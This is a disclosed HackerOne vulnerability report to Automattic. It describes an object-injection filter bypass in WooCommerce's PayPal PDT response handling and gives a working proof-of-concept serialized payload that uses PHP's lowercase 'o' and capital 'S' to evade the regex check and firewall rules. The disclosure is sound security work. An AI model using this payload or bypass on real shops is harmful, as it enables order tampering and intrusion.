# Object Injection in Woocommerce / Handle PDT Responses from PayPal

## Report Details
- **Report ID**: 245228
- **URL**: https://hackerone.com/reports/245228
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2017-07-02T01:13:06.370Z
- **Disclosed**: 2017-09-11T13:48:49.750Z

## Reporter
- **Username**: b258ea62bf297b02afa9854
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: automattic

## Vulnerability Information
At this moment prevention from object injection is in the following line of code: 
```
preg_match( '/^a:2:{/', $raw_custom ) && ! preg_match( '/[CO]:\+?[0-9]+:"/', $raw_custom ) && ( $custom = maybe_unserialize( $raw_custom ) )
```
but the PHP native [unserialize](https://github.com/php/php-src/blob/master/ext/standard/var_unserializer.c) function supports little `o` as option in it and it is a StdClass object. 

Due this protection, we have a bypass (PoC below) e.g. due the fact how woocommerce gets the order we can set any order object we want. As an extra, if combined with capital `S` then for some attacks even known firewall rules will fail/will be bypassed.
```
$attack_str = 'a:2:{i:1;s:3:"key";i:0;o:3:"s:2:"ID";o:1:"s:0:"";o:1:"s:2:"ID";S:1:"1";}}s:9:"order_key";s:3:"key";s:9:"post_type";s:2:"ok";}}';

if (preg_match( '/^a:2:{/', $attack_str ) && ! preg_match( '/[CO]:\+?[0-9]+:"/', $attack_str )){
	var_dump(unserialize($attack_str));
}
```


## Attachments
No attachments
